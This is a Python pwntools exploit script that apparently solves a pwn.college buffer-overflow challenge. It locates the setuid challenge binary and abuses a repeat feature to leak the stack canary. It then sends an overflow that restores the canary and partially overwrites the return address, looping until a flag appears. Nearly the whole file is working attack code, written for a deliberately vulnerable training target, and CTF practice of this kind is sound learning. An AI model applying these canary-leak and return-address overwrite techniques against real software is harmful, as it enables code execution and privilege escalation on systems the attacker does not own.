import re
import sys
import pwn


pwn.context.arch = "amd64"
pwn.context.os = "linux"


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


while True:
    with pwn.process(find_challenge()) as io:
        tee(io)
        elf = pwn.ELF(io.executable)

        payload = [
            b"REPEAT",
        ]
        payload = b"".join(payload)
        io.sendlineafter(b"Payload size:", str(len(payload)).encode())
        io.sendlineafter(b"Send your payload", payload)

        puts_frame_size = 0xC0
        buffer_addr = 0x40
        payload = [
            pwn.cyclic(puts_frame_size - buffer_addr - 8),
            b"\x01",
        ]
        payload = bytearray(b"".join(payload))
        payload[:6] = b"REPEAT"
        io.sendlineafter(b"Payload size:", str(len(payload)).encode())
        io.sendlineafter(b"Send your payload", payload)
        io.recvuntil(b"You said: ")

        if match := re.search(rb"\x01(.{7})", io.recvline()):
            canary = b"\x00" + match.group(1)
        else:
            pwn.log.error("Failed to find canary")

        challenge_frame_size = 0x1D0
        payload = [
            pwn.cyclic(challenge_frame_size - buffer_addr - 8),
            canary,
            pwn.cyclic(8),
            b"\x7d\x18",
        ]

        payload = b"".join(payload)
        io.sendlineafter(b"Payload size:", str(len(payload)).encode())
        io.sendlineafter(b"Send your payload", payload)

        if b"pwn.college{" in io.recvrepeat():
            exit()
